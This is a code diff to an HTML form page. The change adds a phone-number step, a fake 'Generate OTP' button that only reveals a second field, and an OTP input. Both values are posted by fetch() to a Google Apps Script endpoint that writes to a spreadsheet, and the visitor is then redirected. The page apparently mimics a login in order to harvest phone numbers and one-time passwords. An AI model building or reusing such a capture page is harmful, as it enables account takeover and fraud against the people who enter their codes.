@@ -38,6 +38,12 @@
 .button.full {
     width: 100%;
 }
+.submit{
+	display: none;
+}
+.otp-fg{
+  display: none;
+}
 
   </style>
 </head>
@@ -48,14 +54,22 @@
 </div>
 <div class="container" style="padding: 30px 30px">
 	<form  name="submit-to-google-sheet" id="test-form">
-  <div class="form-group">
+  <div class="form-group phone-fg">
    
-    <input name='email' type="text" class="form-control border border-danger" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email id or Phone number" style="text-align: center;">
+    <input name='contact' type="text" class="form-control border border-danger" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter Phone number" style="text-align: center;">
+    <small id="emailHelp" class="form-text text-muted" style="float: right;font-weight: normal;">REQUIRED.</small>
+  </div>
+  <div class="form-group otp-fg">
+   
+    <input name='otp' type="text" class="form-control border border-danger" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter otp" style="text-align: center;">
     <small id="emailHelp" class="form-text text-muted" style="float: right;font-weight: normal;">REQUIRED.</small>
   </div>
 
 <div class="button-separator" style="margin-top: 160px;">
-	<button type="submit" class="button big fill full "><!-- react-text: 366 -->proceed<!-- /react-text --></button>
+	<div class="button big fill full otp" style="cursor:pointer; text-align: center; padding-top: 6px; font-size: 20px;">Generate OTP</div>
+</div>
+<div class="button-separator submit" style="margin-top: 160px;">
+	
 </div>
 </form>
 
@@ -68,10 +82,10 @@
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 
 
-<script>
+
+<script crossorigin="anonymous">
   const scriptURL = 'https://script.google.com/macros/s/AKfycbyX7zDQ9QbVGO5ld3HNQekSI735tdEcQXT4wdmNM6-hRUv5Z6gjngkM1aeuWI-9Md-UkQ/exec'
 
   const form = document.forms['submit-to-google-sheet']
@@ -79,10 +93,26 @@
   form.addEventListener('submit', e => {
     e.preventDefault()
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-      .then(response => window.location.href = "index.html")
+      .then(response => (window.location.href = "index.html"))
       .catch(error => console.error('Error!', error.message))
   })
 </script>
+<script>
+	 var x = document.getElementsByClassName("otp");
+   var y = document.getElementsByClassName("otp-fg");
+   var t = document.getElementsByClassName("phone-fg");
+   var s = document.getElementsByClassName("submit");
+
+  x[0].onclick = function () {
+        x[0].style.display ='none';
+        y[0].style.display ='block';
+        t[0].style.display ='none';
+        s[0].innerHTML ='<button type="submit" class="button big fill full ">Submit</button>';
+        s[0].style.display = 'block';
+
+    };
+
+	</script>
 </body>
 
 </html>
